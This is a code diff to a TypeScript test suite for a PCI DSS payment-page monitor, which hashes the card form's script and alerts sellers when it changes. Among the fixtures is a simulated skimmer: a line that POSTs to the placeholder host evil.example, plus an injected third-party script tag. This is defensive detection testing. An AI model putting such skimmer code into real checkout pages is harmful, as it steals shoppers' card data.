@@ -1,5 +1,6 @@
 // Monitor semanal das páginas de pagamento (PCI DSS 4.0 11.6.1): confere o cabeçalho CSP e o inventário de scripts de
 // /c e /o no próprio domínio e avisa o vendedor quando muda. Fetch falso, sem rede.
+import { createHash } from "node:crypto";
 import { afterAll, beforeAll, describe, expect, test } from "bun:test";
 import { eq } from "drizzle-orm";
 import { cardFormCsp, cardFormHtml } from "@/card-service/page";
@@ -71,6 +72,10 @@ describe("inspectCardFormPage (página do iframe do cartão)", () => {
     const r = inspectForm(formPage());
     expect(r.problems).toEqual([]);
     expect(r.inventory).toEqual(["self:/form.js"]);
+    // Com o sha256 do conteúdo baixado do /form.js: entra no inventário (e no hash guardado).
+    const withSha = inspectCardFormPage(formPage().html, formPage().csp, { origins: ORIGINS, turnstile: false, pageUrl: `${CARD}/form/${STORE}`, formJsSha256: "ab".repeat(32) });
+    expect(withSha.inventory).toEqual([`self:/form.js sha256:${"ab".repeat(32)}`]);
+    expect(withSha.hash).not.toBe(r.hash);
     // As origens da loja mudam o frame-ancestors, não o resultado guardado: trocar o domínio da loja não é alerta.
     const other = inspectForm(formPage(["https://outra.example.com"]), ["https://outra.example.com"]);
     expect(other.problems).toEqual([]);
@@ -183,21 +188,57 @@ describe("job pci_page_monitor", () => {
 
     // Com o iframe, a CSP do checkout ganha frame-src para o domínio do cartão (src/proxy.ts): é a esperada.
     const checkoutCsp = buyerCsp(NONCE, { dev: false, turnstile: false, cardOrigin: CARD });
-    const ok = fakeSite({ "/c/": { html: goodHtml(), csp: checkoutCsp }, "/form/": { html: good, csp } });
+    const FORM_JS = "(()=>{/* formulário */})();";
+    const ok = fakeSite({ "/c/": { html: goodHtml(), csp: checkoutCsp }, "/form/": { html: good, csp }, "/form.js": { html: FORM_JS, csp: null } });
     await run(ok.fetchFn);
     expect(ok.urls).toContain(`${CARD}/form/${shop.storeId}`);
+    expect(ok.urls).toContain(`${CARD}/form.js`);
     const [form] = await t.ownerDb.select().from(pageCheck).where(eq(pageCheck.storeId, shop.storeId)).then((rows) => rows.filter((r) => r.page === "/form"));
-    expect(form).toMatchObject({ ok: true, inventory: ["self:/form.js"] });
+    const sha = createHash("sha256").update(FORM_JS).digest("hex");
+    expect(form).toMatchObject({ ok: true, inventory: [`self:/form.js sha256:${sha}`] });
     expect(await t.ownerDb.select().from(storeAlert).where(eq(storeAlert.storeId, shop.storeId))).toHaveLength(0);
 
     const bad = fakeSite({
       "/c/": { html: goodHtml(), csp: checkoutCsp },
       "/form/": { html: good.replace("</body>", `<script src="https://cdn.terceiro.example/x.js"></script></body>`), csp },
+      "/form.js": { html: FORM_JS, csp: null },
     });
     await run(bad.fetchFn);
     const alerts = await t.ownerDb.select().from(storeAlert).where(eq(storeAlert.storeId, shop.storeId));
     expect(alerts.map((a) => [a.kind, a.detail])).toEqual([["monitor_pagina_pagamento", { code: "script_nao_autorizado", page: "/form" }]]);
     const notices = (await t.ownerDb.select().from(job).where(eq(job.type, "notify_seller"))).filter((j) => j.storeId === shop.storeId);
     expect(notices.map((n) => (n.payload as { page?: string }).page)).toEqual(["/form"]);
+  });
+
+  test("CARD_ISOLATED: conteúdo do /form.js trocado no mesmo caminho avisa (inventario_mudou) uma vez; form.js fora do ar não muda nada", async () => {
+    const shop = await seedShop();
+    const origins = await storeCheckoutOrigins(shop.storeId);
+    const page = { html: cardFormHtml({ storeId: shop.storeId, allowedOrigins: origins }), csp: cardFormCsp(origins, { turnstile: false }) };
+    const checkout = { html: goodHtml(), csp: buyerCsp(NONCE, { dev: false, turnstile: false, cardOrigin: CARD }) };
+    const run = (formJs: { html: string; csp: null; status?: number }) =>
+      createPciPageMonitorHandler({ fetch: fakeSite({ "/c/": checkout, "/form/": page, "/form.js": formJs }).fetchFn, storeIds: [shop.storeId], card: { origin: CARD } })(
+        {} as never,
+        new AbortController().signal,
+      );
+    const formRow = async () =>
+      (await t.ownerDb.select().from(pageCheck).where(eq(pageCheck.storeId, shop.storeId))).find((r) => r.page === "/form");
+    const alerts = async () => (await t.ownerDb.select().from(storeAlert).where(eq(storeAlert.storeId, shop.storeId))).map((a) => a.detail);
+
+    await run({ html: "original();", csp: null });
+    const first = await formRow();
+    expect(first).toMatchObject({ ok: true });
+    expect(await alerts()).toEqual([]);
+
+    // Skimmer: mesmo caminho, outro conteúdo. A página e a CSP continuam iguais.
+    await run({ html: "original();fetch('https://evil.example',{method:'POST'});", csp: null });
+    await run({ html: "original();fetch('https://evil.example',{method:'POST'});", csp: null });
+    expect(await alerts()).toEqual([{ code: "inventario_mudou", page: "/form" }]);
+    const changed = await formRow();
+    expect(changed!.hash).not.toBe(first!.hash);
+
+    // /form.js indisponível: sem conferência (não grava nem avisa).
+    await run({ html: "erro", csp: null, status: 502 });
+    expect((await formRow())!.hash).toBe(changed!.hash);
+    expect(await alerts()).toHaveLength(1);
   });
 });
